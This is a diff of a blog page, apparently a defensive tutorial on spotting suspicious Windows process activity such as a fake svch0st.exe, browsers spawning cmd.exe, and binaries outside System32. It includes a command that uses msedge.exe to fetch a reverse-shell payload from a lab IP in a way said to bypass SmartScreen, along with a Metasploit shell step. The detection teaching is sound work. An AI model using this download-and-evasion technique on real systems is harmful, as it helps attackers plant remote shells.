@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "\/posts\/suspiciousprocessactivity\/suspicious-process-activity\/"
-        },"genre": "posts","keywords": "Fundamental","wordcount":  212 ,
+        },"genre": "posts","keywords": "Fundamental","wordcount":  363 ,
         "url": "\/posts\/suspiciousprocessactivity\/suspicious-process-activity\/","datePublished": "2024-05-09T00:00:00+00:00","dateModified": "2024-05-09T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -69,8 +69,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Suspicious Process Activity</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/tryhardnguyen" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/fundamental/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Fundamental</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-09">2024-05-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;212 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-09">2024-05-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;363 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -137,13 +137,6 @@ Original svchost.exe:
         <img class="zoomed-image" src="/images/SuspiciousProcessActivity/original_svchost.png">
 </div>
 <br>
-Original svchost.exe:
-<br>
-<img class="zoom" src="/images/SuspiciousProcessActivity/original_svchost.png">
-<div class="overlay">
-        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/original_svchost.png">
-</div>
-<br>
 Our fake: svchost.exe
 <br>
 <img class="zoom" src="/images/SuspiciousProcessActivity/svch0st.exe.png">
@@ -173,17 +166,87 @@ In this example, we are going to use msedge.exe to download an reverse shell and
 <br>
 With smart screen:
 <br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/withSmartScreen.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/withSmartScreen.png">
+</div>
+<br>
+The picture bellow show that Microsoft edge is being used to download a reverse shell (svch0st.exe.txt). This method avoid the smart screen.
+<br>
+Command: `msedge.exe  http://192.168.109.6:9000/svch0st.exe.txt`
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/meterpreter_svch0st.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/meterpreter_svch0st.png">
+</div>
+<br>
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/svch0st.exe.txt.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/svch0st.exe.txt.png">
+</div>
+<br>
+<h3 id="suspicious-parent-child-relationship">Suspicious Parent-Child Relationship</h3>
+<p>One example of a Suspicious Parent-Child Relationship is when word.exe (Microsoft Office) or msedge.exe spawn a command prompt.
+<br>
+In the picture below, through Metasploit, I spawn cmd.exe through the command: &ldquo;shell&rdquo;. Then I executed a command that create a file called &ldquo;textone&rdquo; that contains the text &ldquo;Hello&rdquo;.
+<br>
+This activity is all executed under the process: &ldquo;msedge.exe&rdquo;.
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/msedge_cmd1.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/msedge_cmd1.png">
+</div>
+<br>
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/suspicious_msedge.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/suspicious_msedge.png">
+</div>
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/suspicious_msedge1.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/suspicious_msedge1.png">
+</div>
+<br>
+Process Hacker Perspective:
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/suspicious_msedge2.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/suspicious_msedge2.png">
+</div>
+<br>
+As you can see above, cmd.exe parent process is msedge.exe. This mean that msedge.exe spawn cmd.exe which is not a normal activity.
+<p>SIEM Perspective:
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/suspicious_msedge3.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/suspicious_msedge3.png">
+</div>
+<br>
+If an adversary spawn cmd.exe using msedge.exe. You can note the process id of command line and follow the chain of command execution.
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/suspicious_msedge4.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/suspicious_msedge4.png">
+</div>
+<br>
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/suspicious_msedge5.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/suspicious_msedge5.png">
+</div>
+<br>
+<h3 id="suspicious-binaries-path">Suspicious Binaries Path</h3>
+<p>Common Windows Process usually run under: C:\Windows\System32\. Any &ldquo;Windows process&rdquo; residing outside that file path raise a suspicion.
+<br>
 <img class="zoom" src="/images/SuspiciousProcessActivity/svch0st.exe.png"></p>
 <div class="overlay">
         <img class="zoomed-image" src="/images/SuspiciousProcessActivity/svch0st.exe.png">
 </div>
 <br>
-The picture show that microsoft edge is being used to download a reverse_shell (svch0st.exe.txt). This method avoid the smart screen.
-<br>
-Command: `msedge.exe  http://192.168.109.6:9000/svch0st.exe.txt`
-<br>
-<h3 id="suspicious-parent-child-relationship">Suspicious Parent-Child Relationship</h3>
-<h3 id="suspicious-binaries-path">Suspicious Binaries Path</h3>
+As you can see from the picture above, svch0st.exe resides in "C:\\Users\\jKing\\Downloads". Which is awfully suspicious. Normally, svchost.exe resides in C:\\Windows\\System32.
+<p>That&rsquo;s all I wanted to cover.</p>
 <!-- Zoom Animation Feature -->
 <script>
 	const zooms = document.querySelectorAll('.zoom');
